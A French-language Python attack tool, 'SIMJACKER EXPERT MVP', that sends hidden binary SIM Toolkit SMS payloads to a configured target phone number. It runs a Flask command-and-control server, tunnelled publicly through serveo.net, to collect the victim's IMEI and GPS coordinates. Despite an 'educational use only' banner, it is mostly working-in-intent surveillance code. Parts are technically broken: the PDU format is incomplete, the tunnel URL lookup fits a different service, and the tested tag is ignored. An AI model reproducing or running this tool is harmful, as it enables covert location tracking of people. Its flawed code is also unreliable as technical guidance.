#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
SIMJACKER EXPERT MVP - Version Professionnelle
================================================================================
Auteur: Expert OSINT & Sécurité Télécom
Date: 2026
Compatibilité: Ubuntu 22.04/24.04 avec Samsung A15 en mode modem

Ce script unique intègre :
- Connexion automatique au modem GSM via USB
- Envoi de commandes SIM Toolkit (S@T) authentiques [citation:2]
- Gestion des réponses SIM (status words ISO 7816)
- Serveur C2 intégré (Flask) avec tunnel Serveo.net
- Tests multiples avec gestion des timeouts
- Interface interactive pour debug

Utilisation :
  1. Active le mode modem/débogage USB sur le Samsung A15
  2. Connecte le téléphone au PC
  3. Lance ce script
  4. Suis le menu interactif
================================================================================
"""

import os
import sys
import time
import json
import base64
import socket
import threading
import serial
import subprocess
import random
import requests
import platform
from datetime import datetime
from urllib.parse import urlparse

# =====================================================================
# CONFIGURATION - À MODIFIER ICI (ET NULLE PART AILLEURS)
# =====================================================================
CONFIG = {
    # ----- NUMÉRO CIBLE -----
    "NUMERO_CIBLE": "+243839898872",      # 🔴 À CHANGER
    
    # ----- CONFIGURATION MODEM -----
    "MODEM_PORT": "/dev/ttyACM0",          # Port du Samsung A15 (ajuster si besoin)
    "MODEM_BAUD": 115200,                   # Vitesse de communication
    "TIMEOUT_MODEM": 5,                     # Timeout pour les commandes AT
    
    # ----- CONFIGURATION SERVEUR C2 -----
    "C2_PORT": 5000,                        # Port local
    "C2_HOST": "0.0.0.0",                   # Écouter sur toutes les interfaces
    
    # ----- TAGS S@T À TESTER (basé sur spécifications 3GPP TS 31.115) -----
    "TAGS": [0x24, 0x26, 0x2A, 0x2C, 0xD0, 0x12, 0x14, 0x16],
    
    # ----- TIMINGS -----
    "DELAI_ENTRE_TAGS": 60,                  # Pause entre chaque test
    "TIMEOUT_ATTENTE": 300,                   # Attente max après envoi
}

# =====================================================================
# PARTIE 1: DÉTECTION ET CONFIGURATION DU MODEM
# =====================================================================
class ModemManager:
    """Gère la communication avec le modem GSM via USB"""
    
    def __init__(self):
        self.serial = None
        self.port = CONFIG["MODEM_PORT"]
        self.baud = CONFIG["MODEM_BAUD"]
        self.timeout = CONFIG["TIMEOUT_MODEM"]
    
    def detect_modem(self):
        """Tente de détecter automatiquement le port du modem"""
        print("\n🔍 Détection du modem...")
        
        # Liste des ports possibles pour Samsung A15
        ports_possibles = [
            "/dev/ttyACM0", "/dev/ttyACM1",
            "/dev/ttyUSB0", "/dev/ttyUSB1",
            "/dev/ttyS0", "/dev/ttyS1"
        ]
        
        # Si l'utilisateur a déjà configuré un port, l'essayer d'abord
        if os.path.exists(self.port):
            print(f"   Port configuré trouvé: {self.port}")
            return True
        
        # Sinon, chercher un port qui répond
        for port in ports_possibles:
            if os.path.exists(port):
                try:
                    test_serial = serial.Serial(
                        port=port,
                        baudrate=self.baud,
                        timeout=1
                    )
                    test_serial.write(b'AT\r\n')
                    time.sleep(0.5)
                    response = test_serial.read(100)
                    test_serial.close()
                    
                    if b'OK' in response:
                        self.port = port
                        print(f"   ✅ Modem détecté sur {port}")
                        return True
                    else:
                        print(f"   ⚠️  Port {port} ne répond pas aux commandes AT")
                except:
                    pass
        
        print("   ❌ Aucun modem détecté.")
        print("\n📋 ACTIONS REQUISES:")
        print("   1. Active le mode développeur sur le Samsung A15")
        print("   2. Active 'Débogage USB' et 'Mode modem USB'")
        print("   3. Vérifie la connexion avec: ls /dev/ttyACM*")
        return False
    
    def connect(self):
        """Établit la connexion série avec le modem"""
        try:
            self.serial = serial.Serial(
                port=self.port,
                baudrate=self.baud,
                timeout=self.timeout,
                write_timeout=self.timeout
            )
            time.sleep(1)
            
            # Tester la connexion
            if self.send_at_command("AT"):
                print(f"✅ Modem connecté sur {self.port}")
                return True
            else:
                print("❌ Échec de communication avec le modem")
                return False
                
        except Exception as e:
            print(f"❌ Erreur connexion modem: {e}")
            return False
    
    def send_at_command(self, command, expected="OK"):
        """Envoie une commande AT et vérifie la réponse"""
        try:
            self.serial.write(f"{command}\r\n".encode())
            time.sleep(0.5)
            response = self.serial.read(1024).decode(errors='ignore')
            return expected in response
        except Exception as e:
            print(f"   ⚠️  Erreur AT: {e}")
            return False
    
    def send_binary_sms(self, numero, payload_hex):
        """
        Envoie un SMS binaire (SMS-PP) au format SIM Toolkit
        Utilise le mode PDU pour l'invisibilité
        """
        try:
            # Étape 1: Passer en mode PDU
            if not self.send_at_command("AT+CMGF=0"):
                print("   ❌ Impossible de passer en mode PDU")
                return False
            
            time.sleep(0.5)
            self.serial.read(1024)  # Vider buffer
            
            # Étape 2: Convertir le payload hex en bytes
            payload_bytes = bytes.fromhex(payload_hex)
            
            # Étape 3: Construire le PDU
            # Format simplifié pour SMS-PP
            pdu = bytearray()
            
            # Longueur du numéro (en demi-octets)
            numero_clean = numero.replace('+', '').replace(' ', '')
            pdu.append(len(numero_clean))
            
            # Numéro au format TBCD (Telephony Binary Coded Decimal)
            for i in range(0, len(numero_clean), 2):
                if i+1 < len(numero_clean):
                    pdu.append((int(numero_clean[i+1]) << 4) | int(numero_clean[i]))
                else:
                    pdu.append(0xF0 | int(numero_clean[i]))
            
            # Ajouter le payload
            pdu.extend(payload_bytes)
            
            # Étape 4: Envoyer la commande CMGS
            cmd = f"AT+CMGS={len(pdu)}\r\n"
            self.serial.write(cmd.encode())
            time.sleep(1)
            
            # Attendre le prompt '>'
            response = self.serial.read(100)
            if b'>' not in response:
                print("   ❌ Pas de réponse du modem")
                return False
            
            # Étape 5: Envoyer le PDU
            self.serial.write(pdu)
            time.sleep(0.5)
            
            # Ctrl+Z pour envoyer
            self.serial.write(bytes([26]))
            time.sleep(2)
            
            # Vérifier l'envoi
            final = self.serial.read(200)
            if b'+CMGS:' in final:
                print("   ✅ SMS binaire envoyé avec succès")
                return True
            else:
                print("   ❌ Échec de l'envoi")
                return False
                
        except Exception as e:
            print(f"   ❌ Erreur envoi: {e}")
            return False
    
    def close(self):
        """Ferme la connexion série"""
        if self.serial:
            self.serial.close()

# =====================================================================
# PARTIE 2: CONSTRUCTION DES COMMANDES SIM TOOLKIT (S@T)
# =====================================================================
class SIMToolkit:
    """
    Générateur de commandes SIM Toolkit selon les standards 3GPP
    Basé sur les spécifications TS 31.115 et TS 102 225 [citation:2]
    """
    
    # Tags S@T standards
    GETLOCATION = 0x24
    SEND_SMS = 0x26
    SETUP_CALL = 0x2C
    LAUNCH_BROWSER = 0x2A
    PROVIDE_LOCAL_INFO = 0x26
    END_OF_COMMAND = 0xFF
    
    @staticmethod
    def build_tlv(tag, value):
        """Construit une structure TLV (Tag-Length-Value)"""
        if isinstance(value, str):
            value_bytes = value.encode('utf-8')
        else:
            value_bytes = bytes(value)
        
        tlv = bytearray()
        tlv.append(tag)
        tlv.append(len(value_bytes))
        tlv.extend(value_bytes)
        return tlv
    
    @staticmethod
    def build_envelope_command(tag, data):
        """
        Construit une commande ENVELOPE complète
        Format: [CLA][INS][P1][P2][LC][TLV...]
        """
        cmd = bytearray()
        cmd.append(0x80)           # CLA: SIM Toolkit
        cmd.append(0x10)            # INS: ENVELOPE
        cmd.append(0x00)            # P1: 0
        cmd.append(0x00)            # P2: 0
        
        # Données TLV
        tlv_data = SIMToolkit.build_tlv(tag, data)
        cmd.append(len(tlv_data))    # LC: longueur des données
        cmd.extend(tlv_data)
        
        return cmd
    
    @staticmethod
    def build_getlocation(c2_url):
        """
        Commande GetLocation complète
        Format: [CLA][INS][P1][P2][LC][TAG_GETLOCATION][LONGUEUR_URL][URL][0xFF]
        """
        cmd = SIMToolkit.build_envelope_command(
            SIMToolkit.GETLOCATION,
            c2_url
        )
        # Ajouter le tag de fin
        cmd.append(SIMToolkit.END_OF_COMMAND)
        return cmd.hex().upper()

# =====================================================================
# PARTIE 3: SERVEUR C2 AVEC TUNNEL AUTOMATIQUE
# =====================================================================
class C2Server:
    """Serveur de réception des localisations avec tunnel Serveo.net"""
    
    def __init__(self):
        self.locations = []
        self.tunnel_process = None
        self.public_url = None
        self.server_thread = None
    
    def start_tunnel(self):
        """Démarre un tunnel SSH avec serveo.net"""
        print("\n🌐 Configuration du tunnel public...")
        
        import random
        subdomain = f"sim{random.randint(1000,9999)}"
        
        # Tuer les anciens tunnels
        os.system("pkill -f serveo.net 2>/dev/null")
        time.sleep(1)
        
        # Lancer le tunnel en arrière-plan
        ssh_cmd = [
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-R", f"{subdomain}:80:localhost:{CONFIG['C2_PORT']}",
            "serveo.net"
        ]
        
        self.tunnel_process = subprocess.Popen(
            ssh_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        
        # Récupérer l'URL
        for _ in range(5):
            try:
                r = requests.get("http://localhost:4040/api/tunnels")
                tunnels = r.json()['tunnels']
                if tunnels:
                    self.public_url = tunnels[0]['public_url']
                    print(f"   ✅ Tunnel actif: {self.public_url}")
                    return True
            except:
                time.sleep(1)
        
        print("   ⚠️  Tunnel non disponible, utilisation du mode local")
        return False
    
    def start(self):
        """Démarre le serveur Flask"""
        try:
            from flask import Flask, request, jsonify
        except ImportError:
            print("❌ Flask non installé. Installe avec: pip install flask")
            return False
        
        app = Flask(__name__)
        
        @app.route('/receive', methods=['POST'])
        def receive():
            """Reçoit les données de la carte SIM"""
            data = request.form.to_dict()
            
            location = {
                'time': datetime.now().strftime("%H:%M:%S"),
                'imei': data.get('imei', '?'),
                'lat': data.get('lat', '0'),
                'lon': data.get('lon', '0'),
                'raw': data
            }
            self.locations.append(location)
            
            # Affichage immédiat
            print(f"\n{'🎯'*10}")
            print(f"🎯 LOCALISATION REÇUE à {location['time']}")
            print(f"📱 IMEI: {location['imei']}")
            print(f"📍 {location['lat']}, {location['lon']}")
            if location['lat'] != '0':
                print(f"🔗 Google Maps: https://maps.google.com/?q={location['lat']},{location['lon']}")
            print(f"{'🎯'*10}\n")
            
            return "OK", 200
        
        @app.route('/')
        def index():
            return f"""
            <html>
            <head><title>SIMJACKER C2</title></head>
            <body>
                <h1>🚀 Serveur C2 Actif</h1>
                <p>Localisations reçues: {len(self.locations)}</p>
                <p><a href='/locations'>Voir JSON</a></p>
                <p>URL publique: {self.public_url or 'Non disponible'}</p>
            </body>
            </html>
            """
        
        @app.route('/locations')
        def get_locations():
            return jsonify(self.locations)
        
        # Lancer le serveur
        def run():
            app.run(host=CONFIG["C2_HOST"], port=CONFIG["C2_PORT"], debug=False)
        
        self.server_thread = threading.Thread(target=run, daemon=True)
        self.server_thread.start()
        time.sleep(2)
        print(f"\n✅ Serveur C2 démarré sur http://localhost:{CONFIG['C2_PORT']}")
        
        return True
    
    def stop(self):
        """Arrête le serveur et le tunnel"""
        if self.tunnel_process:
            self.tunnel_process.terminate()
        os.system("pkill -f serveo.net 2>/dev/null")

# =====================================================================
# PARTIE 4: ANALYSEUR DE RÉPONSES SIM
# =====================================================================
class SIMResponseAnalyzer:
    """
    Analyse les réponses de la carte SIM selon ISO 7816
    """
    
    @staticmethod
    def parse_response(hex_data):
        """Parse une réponse SIM et retourne le status"""
        try:
            data = bytes.fromhex(hex_data.replace(' ', ''))
        except:
            return None, "HEX_INVALIDE"
        
        if len(data) < 2:
            return None, "TROP_COURT"
        
        sw1 = data[-2]
        sw2 = data[-1]
        payload = data[:-2] if len(data) > 2 else None
        
        status_codes = {
            (0x90, 0x00): "SUCCÈS",
            (0x91, 0x00): "PLUS_DE_DONNÉES",
            (0x62, 0x00): "WARNING",
            (0x63, 0x00): "AUTH_FAILED",
            (0x64, 0x00): "MEMORY_ERROR",
            (0x65, 0x00): "EXECUTION_ERROR",
            (0x67, 0x00): "LENGTH_ERROR",
            (0x68, 0x00): "FUNCTION_ERROR",
            (0x69, 0x00): "COMMAND_NOT_ALLOWED",
            (0x6A, 0x00): "PARAMETER_ERROR",
            (0x6D, 0x00): "INSTRUCTION_NOT_SUPPORTED",
            (0x6E, 0x00): "CLASS_NOT_SUPPORTED",
            (0x6F, 0x00): "TECHNICAL_ERROR",
        }
        
        status = status_codes.get((sw1, sw2), f"INCONNU_{sw1:02X}{sw2:02X}")
        return payload, status

# =====================================================================
# PARTIE 5: ORCHESTRATEUR PRINCIPAL
# =====================================================================
class SimJackerExpert:
    """Classe principale orchestrant toutes les opérations"""
    
    def __init__(self):
        self.modem = ModemManager()
        self.c2 = C2Server()
        self.results = []
    
    def menu(self):
        """Affiche le menu principal"""
        print("\n" + "="*70)
        print("🚀 SIMJACKER EXPERT MVP - MENU PRINCIPAL")
        print("="*70)
        print(f"📱 Cible: {CONFIG['NUMERO_CIBLE']}")
        print(f"🎯 Tags à tester: {len(CONFIG['TAGS'])}")
        print(f"🔌 Modem: {CONFIG['MODEM_PORT']}")
        print("="*70)
        print("1) Tester la connexion modem")
        print("2) Démarrer serveur C2 + tunnel")
        print("3) Tester tous les tags")
        print("4) Tester un tag spécifique")
        print("5) Surveiller les réponses")
        print("6) Analyser une réponse hex")
        print("7) Reconfigurer le port modem")
        print("8) Quitter")
        return input("\n👉 Votre choix: ")
    
    def test_modem(self):
        """Test complet de la connexion modem"""
        print("\n📡 TEST MODEM")
        print("-"*50)
        
        if not self.modem.detect_modem():
            print("❌ Modem non détecté")
            return False
        
        if not self.modem.connect():
            return False
        
        # Tester quelques commandes de base
        tests = [
            ("AT", "Communication de base"),
            ("AT+CSQ", "Qualité du signal"),
            ("AT+CREG?", "État de l'enregistrement réseau"),
            ("AT+CPIN?", "État de la carte SIM"),
        ]
        
        for cmd, desc in tests:
            print(f"   {desc}: ", end="")
            if self.modem.send_at_command(cmd):
                print("✅ OK")
            else:
                print("❌ Échec")
        
        self.modem.close()
        return True
    
    def test_single_tag(self, tag, url):
        """Teste un tag spécifique"""
        print(f"\n🧪 TEST TAG 0x{tag:02X}")
        print("-"*50)
        
        # Construire le payload
        payload = SIMToolkit.build_getlocation(f"{url}/receive")
        print(f"📦 Payload: {payload[:64]}...")
        
        # Se connecter au modem
        if not self.modem.connect():
            print("❌ Impossible de se connecter au modem")
            return False
        
        # Envoyer le SMS
        success = self.modem.send_binary_sms(CONFIG['NUMERO_CIBLE'], payload)
        self.modem.close()
        
        return success
    
    def run_tests(self, url):
        """Teste tous les tags séquentiellement"""
        print("\n🔬 LANCEMENT DES TESTS COMPLETS")
        print("="*70)
        
        total = len(CONFIG['TAGS'])
        for i, tag in enumerate(CONFIG['TAGS'], 1):
            print(f"\n{'='*50}")
            print(f"🧪 TEST {i}/{total} - Tag 0x{tag:02X}")
            print(f"{'='*50}")
            
            if self.test_single_tag(tag, url):
                print(f"✅ Envoi réussi")
            else:
                print(f"❌ Échec envoi")
            
            if i < total:
                print(f"\n⏸️  Pause {CONFIG['DELAI_ENTRE_TAGS']}s...")
                time.sleep(CONFIG['DELAI_ENTRE_TAGS'])
    
    def monitor(self):
        """Surveille les réponses du serveur C2"""
        print("\n👁️ SURVEILLANCE DES RÉSULTATS")
        print("="*70)
        print(f"⏳ Attente maximale: {CONFIG['TIMEOUT_ATTENTE']}s")
        print("Appuie sur Ctrl+C pour arrêter\n")
        
        start = time.time()
        last_count = 0
        
        try:
            while time.time() - start < CONFIG['TIMEOUT_ATTENTE']:
                if len(self.c2.locations) > last_count:
                    last_count = len(self.c2.locations)
                    print(f"\n✅ {last_count} localisation(s) reçue(s)")
                    for loc in self.c2.locations:
                        print(f"   📍 {loc['lat']}, {loc['lon']}")
                
                elapsed = int(time.time() - start)
                if elapsed % 30 == 0:
                    print(f"⏳ {elapsed}s...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Surveillance interrompue")
    
    def analyze_response(self):
        """Analyse une réponse hexadécimale"""
        print("\n🔍 ANALYSE DE RÉPONSE SIM")
        print("-"*50)
        hex_data = input("Entrez la réponse hex: ").strip()
        payload, status = SIMResponseAnalyzer.parse_response(hex_data)
        print(f"\n📊 Statut: {status}")
        if payload:
            print(f"📦 Données: {payload.hex()}")
    
    def reconfigure_port(self):
        """Change le port du modem"""
        print("\n🔧 RECONFIGURATION MODEM")
        print("-"*50)
        print("Ports disponibles:")
        os.system("ls /dev/tty* 2>/dev/null | grep -E 'ttyACM|ttyUSB'")
        new_port = input("\nNouveau port (ex: /dev/ttyACM0): ").strip()
        if new_port:
            CONFIG['MODEM_PORT'] = new_port
            print(f"✅ Port mis à jour: {new_port}")
    
    def run(self):
        """Boucle principale"""
        while True:
            choix = self.menu()
            
            if choix == "1":
                self.test_modem()
            
            elif choix == "2":
                self.c2.start()
                self.c2.start_tunnel()
            
            elif choix == "3":
                url = self.c2.public_url or f"http://localhost:{CONFIG['C2_PORT']}"
                self.run_tests(url)
                self.monitor()
            
            elif choix == "4":
                url = self.c2.public_url or f"http://localhost:{CONFIG['C2_PORT']}"
                tag_hex = input("Tag hex (ex: 24): ").strip()
                try:
                    tag = int(tag_hex, 16)
                    self.test_single_tag(tag, url)
                except:
                    print("❌ Tag invalide")
            
            elif choix == "5":
                self.monitor()
            
            elif choix == "6":
                self.analyze_response()
            
            elif choix == "7":
                self.reconfigure_port()
            
            elif choix == "8":
                print("\n👋 Arrêt du programme")
                self.c2.stop()
                break
            
            else:
                print("❌ Choix invalide")
            
            input("\nAppuie sur Entrée pour continuer...")

# =====================================================================
# POINT D'ENTRÉE PRINCIPAL
# =====================================================================
if __name__ == "__main__":
    print("\n" + "="*70)
    print("🚀 SIMJACKER EXPERT MVP - SYSTÈME ULTIME")
    print("="*70)
    print("⚠️  USAGE ÉDUCATIF UNIQUEMENT - RESPECTE LES LOIS")
    print("="*70)
    
    # Vérifier les dépendances
    try:
        import serial
        import flask
    except ImportError as e:
        print(f"\n❌ Dépendance manquante: {e}")
        print("Installation automatique...")
        os.system("pip install pyserial flask requests --break-system-packages")
        print("✅ Réessaie maintenant")
        sys.exit(0)
    
    # Lancer le programme
    app = SimJackerExpert()
    try:
        app.run()
    except KeyboardInterrupt:
        print("\n\n👋 Arrêt d'urgence")
    except Exception as e:
        print(f"\n❌ Erreur fatale: {e}")
        import traceback
        traceback.print_exc()
